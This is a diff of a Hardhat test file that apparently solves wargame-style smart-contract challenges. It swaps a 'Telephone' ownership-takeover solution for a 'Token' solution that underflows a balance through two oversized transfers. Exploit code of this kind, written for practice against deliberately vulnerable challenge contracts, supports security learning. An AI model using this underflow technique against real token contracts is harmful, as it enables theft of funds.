@@ -1,43 +1,39 @@
 import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 import { expect } from "chai";
-import { Contract } from "ethers";
+import { BigNumber, Contract } from "ethers";
 import { ethers } from "hardhat";
 import { getNewInstance, submitInstance } from "../utils";
 
-const LEVEL_ADDRESS = "0x0b6F6CE4BCfB70525A31454292017F640C10c768";
+const LEVEL_ADDRESS = "0x63bE8347A617476CA461649897238A31835a32CE";
 
 let owner: SignerWithAddress;
 let attacker: SignerWithAddress;
 let txn: any;
 let contract: Contract;
-let attackContract: Contract;
 
-describe("Telephone", () => {
+describe.only("Token", () => {
 
     beforeEach(async () => {
         [owner, attacker] = await ethers.getSigners();
 
-        const contractFactory = await ethers.getContractFactory("Telephone");
+        const contractFactory = await ethers.getContractFactory("Token");
         const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
         contract = await contractFactory.attach(challengeAddr);
-
-        const telephoneAttackFactory = await ethers.getContractFactory("TelephoneAttack");
-        attackContract = await telephoneAttackFactory.deploy(contract.address);
     });
 
     it("Should solve the challenge", async function () {
         
-        const initialOwner = await contract.owner();
-
+        const initialBalance: BigNumber = await contract.balanceOf(owner.address);
+        
         expect(await submitInstance(contract.address)).to.be.false;
-        expect(initialOwner).to.not.equal(owner.address);
+        expect(initialBalance).to.equal(BigNumber.from(20));
 
-        txn = await attackContract.claimContract();
-        await txn.wait();
-
-        const currentOwner = await contract.owner();
-
-        expect(currentOwner).to.equal(owner.address);
+        // cause an overflow
+        txn = contract.transfer(attacker.address, 20);
+        txn = contract.transfer(attacker.address, 20);
+        
+        expect(await contract.balanceOf(attacker.address)).to.be.gt(initialBalance);
+        expect(await contract.balanceOf(owner.address)).to.be.gt(initialBalance);
         expect(await submitInstance(contract.address), "level is not complete").to.be.true;
     });
 });
